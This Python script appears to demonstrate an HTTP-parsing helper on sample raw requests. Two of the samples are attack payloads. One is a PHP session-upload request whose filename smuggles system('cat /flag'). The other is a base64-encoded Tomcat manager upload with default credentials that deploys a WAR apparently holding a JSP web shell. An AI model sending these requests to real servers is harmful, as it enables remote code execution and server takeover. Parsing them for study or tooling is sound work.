from ParseRawHTTP import ParseRawHTTP

Raw_HTTP_Str = '''POST /login HTTP/1.1
Host: 127.0.0.1:8080
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
x-forwarded-for: 127.0.0.1
Connection: close

username=rayi&password=123456

'''

http_url,http_method,http_headers_dict,http_body = ParseRawHTTP(Raw_HTTP_Str)
print("URL : http://" + http_url)
print("+--------------------------------------------------------------------+")
print("Headers : " , http_headers_dict)
print("+--------------------------------------------------------------------+")
print("Body : ", http_body.decode('utf8'))
print("+--------------------------------------------------------------------+\n")

File_Upload = '''
POST / HTTP/1.1
Host: 192.168.39.2:8000
Pragma: no-cache
Cache-Control: no-cache
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=rayi
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfhBkNluTJKBLYIEw
Content-Length: 352


------WebKitFormBoundaryfhBkNluTJKBLYIEw
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

asd

------WebKitFormBoundaryfhBkNluTJKBLYIEw
Content-Disposition: form-data; name="upload"; filename="<?php system('cat /flag');?>"
Content-Type: image/gif

G

------WebKitFormBoundaryfhBkNluTJKBLYIEw--

'''


http_url,http_method,http_headers_dict,http_body = ParseRawHTTP(File_Upload)
print("URL : http://" + http_url)
print("+--------------------------------------------------------------------+")
print("Headers : " , http_headers_dict)
print("+--------------------------------------------------------------------+")
print("Body : ", http_body.decode('utf8'))
print("+--------------------------------------------------------------------+\n")

Upload_Binary_File = '''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'''

http_url,http_method,http_headers_dict,http_body = ParseRawHTTP(Upload_Binary_File,is_base64=True)
print("URL : http://" + http_url)
print("+--------------------------------------------------------------------+")
print("Headers : " , http_headers_dict)
print("+--------------------------------------------------------------------+")
print("Body : ", http_body)
print("+--------------------------------------------------------------------+\n")